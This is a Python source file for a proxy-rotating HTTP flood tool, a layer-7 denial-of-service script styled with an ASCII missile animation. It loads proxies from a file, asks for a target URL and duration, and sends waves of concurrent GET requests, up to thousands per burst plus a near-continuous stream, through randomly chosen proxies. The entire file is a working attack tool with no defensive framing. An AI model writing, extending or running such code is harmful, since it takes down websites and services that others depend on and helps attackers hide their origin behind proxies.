import asyncio
import aiohttp
import random
import time
import os
import shutil

# Terminal size
TERMINAL_SIZE = shutil.get_terminal_size((80, 40))
TERMINAL_WIDTH = TERMINAL_SIZE.columns
TERMINAL_HEIGHT = TERMINAL_SIZE.lines - 2

# Clear terminal
def clear():
    print("\033[H\033[J", end="")

# Load proxies from premium.txt
def load_proxies():
    proxies = []
    try:
        with open('premium.txt', 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    proxies.append(line)
        print(f"Loaded {len(proxies)} proxies from premium.txt")
        return proxies
    except FileNotFoundError:
        print("Error: premium.txt file not found!")
        return []

# Generate random real-looking IPv4
def random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

# Countdown loader with random IPs
async def countdown_loader(seconds):
    for i in range(seconds, 0, -1):
        clear()
        print(f"SG - RELOADING | {i}s")
        for _ in range(5):
            print(random_ip())
        await asyncio.sleep(1)

# Small missile body
MISSILE_BODY = [
"  /\\  ",
" |=|  ",
" |=|  ",
" |=|  ",
" |=|  "
]

# Exhaust colors
EXHAUST_FRAMES = [
    "\033[31m ^^^ \033[0m",
    "\033[33m *** \033[0m",
    "\033[91m !!! \033[0m",
    "\033[93m ::: \033[0m"
]

# Missile types: speed -> request batch
MISSILE_BATCHES = {
    1: 50,
    2: 200,
    3: 300,
    4: 1000
}

ULTRA_SUPER_BATCH = 3500
LAST_BATCH = 500
SUPERNOVA_INITIAL = 1000
SUPERNOVA_STREAM = 50 * 10  # 500/ms

class Missile:
    def __init__(self, speed=None):
        self.reset(speed)

    def reset(self, speed=None):
        if speed:
            self.speed = speed
        else:
            self.speed = random.choice([1,2,3,4])
        self.batch = MISSILE_BATCHES.get(self.speed, 50)
        self.x = TERMINAL_WIDTH // 2 - len(MISSILE_BODY[0]) // 2
        self.y = TERMINAL_HEIGHT
        self.active = False
        self.launch_delay = random.uniform(1,3)
        self.exhaust = random.choice(EXHAUST_FRAMES)

    def move(self):
        if self.active:
            self.y -= self.speed
            if self.y < -len(MISSILE_BODY):
                self.reset()
                self.active = False

# Draw missiles with only number of requests
def draw_missiles(missiles):
    buffer = [""] * TERMINAL_HEIGHT
    for missile in missiles:
        if missile.active:
            for i, line in enumerate(MISSILE_BODY):
                pos = missile.y - len(MISSILE_BODY) + i
                if 0 <= pos < TERMINAL_HEIGHT:
                    if i == 0:
                        buffer[pos] += " " * missile.x + line + f"  [{missile.batch}]"
                    else:
                        buffer[pos] += " " * missile.x + line
            exhaust_pos = missile.y
            if 0 <= exhaust_pos < TERMINAL_HEIGHT:
                buffer[exhaust_pos] += " " * missile.x + random.choice(EXHAUST_FRAMES)
    clear()
    print("\n".join(buffer))

# Get random proxy from loaded list
def get_random_proxy(proxies):
    if proxies:
        return random.choice(proxies)
    return None

# Create proxy connector based on proxy format
def create_proxy_connector(proxy):
    if not proxy:
        return None
    
    # Handle different proxy formats
    if proxy.startswith('http://') or proxy.startswith('https://'):
        return proxy
    elif proxy.startswith('socks4://') or proxy.startswith('socks5://'):
        return proxy
    else:
        # Assume it's IP:PORT format, default to HTTP
        return f"http://{proxy}"

# Send batch requests with proxies
async def send_requests(target, batch, proxies):
    if not proxies:
        # Fallback to direct connection if no proxies available
        async with aiohttp.ClientSession() as session:
            tasks = []
            for _ in range(batch):
                tasks.append(session.get(target))
            try:
                await asyncio.gather(*tasks, return_exceptions=True)
            except:
                pass
        return

    async with aiohttp.ClientSession() as session:
        tasks = []
        for _ in range(batch):
            proxy_url = create_proxy_connector(get_random_proxy(proxies))
            try:
                tasks.append(session.get(target, proxy=proxy_url, timeout=aiohttp.ClientTimeout(total=10)))
            except Exception as e:
                # If proxy setup fails, try direct connection
                tasks.append(session.get(target, timeout=aiohttp.ClientTimeout(total=10)))
        
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except:
            pass

# Ultra-super missile every 5s
async def ultra_super_missile(target, duration, proxies):
    start_time = time.time()
    while time.time() - start_time < duration:
        asyncio.create_task(send_requests(target, ULTRA_SUPER_BATCH, proxies))
        await asyncio.sleep(5)

# Last missile every 0.5s
async def last_missile(target, duration, proxies):
    start_time = time.time()
    while time.time() - start_time < duration:
        asyncio.create_task(send_requests(target, LAST_BATCH, proxies))
        await asyncio.sleep(0.5)

# Supernova missile
async def supernova_missile(target, duration, proxies):
    start_time = time.time()
    while time.time() - start_time < duration:
        delay = random.uniform(5, 10)
        await asyncio.sleep(delay)

        # Initial 1000 requests
        asyncio.create_task(send_requests(target, SUPERNOVA_INITIAL, proxies))

        # Stream of 500/ms while rising (~2s flight)
        async def stream():
            t_end = time.time() + 2
            while time.time() < t_end:
                asyncio.create_task(send_requests(target, SUPERNOVA_STREAM, proxies))
                await asyncio.sleep(0.001)
        asyncio.create_task(stream())

# Main loop
async def main():
    # Load proxies at startup
    proxies = load_proxies()
    
    if not proxies:
        print("Warning: No proxies loaded. Continuing with direct connections.")
        response = input("Continue anyway? (y/n): ")
        if response.lower() != 'y':
            return
    
    target = input("¿TARGZ > ")
    duration = int(input("¿DU > "))

    await countdown_loader(5)

    missiles = [Missile() for _ in range(2)]

    # Start heavy missiles with proxies
    asyncio.create_task(ultra_super_missile(target, duration, proxies))
    asyncio.create_task(last_missile(target, duration, proxies))
    asyncio.create_task(supernova_missile(target, duration, proxies))

    start_time = time.time()
    last_launch_times = [0]*len(missiles)

    while time.time() - start_time < duration:
        now = time.time()
        for idx, missile in enumerate(missiles):
            if not missile.active and now - last_launch_times[idx] >= missile.launch_delay:
                missile.active = True
                last_launch_times[idx] = now
                asyncio.create_task(send_requests(target, missile.batch, proxies))
            missile.move()
        draw_missiles(missiles)
        await asyncio.sleep(0.05)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        clear()
